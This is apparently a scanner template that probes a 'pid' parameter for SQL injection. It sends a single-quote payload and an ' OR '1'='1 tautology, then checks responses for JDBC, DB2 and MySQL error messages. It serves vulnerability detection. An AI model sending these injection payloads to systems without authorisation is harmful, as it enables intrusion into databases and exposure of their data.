id: sqli-generic-07
name: 'SQLi error generic via pid'
severity: high
type: active
tags:
  - sqli
  - injection
  - generic
description: 'Triggers generic error via pid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      pid:
        - ''''
        - ''' OR ''1''=''1'
    matchers:
      - type: regex
        part: body
        regex:
          - 'JDBC'
          - 'DB2 SQL error'
          - 'Warning: mysql'
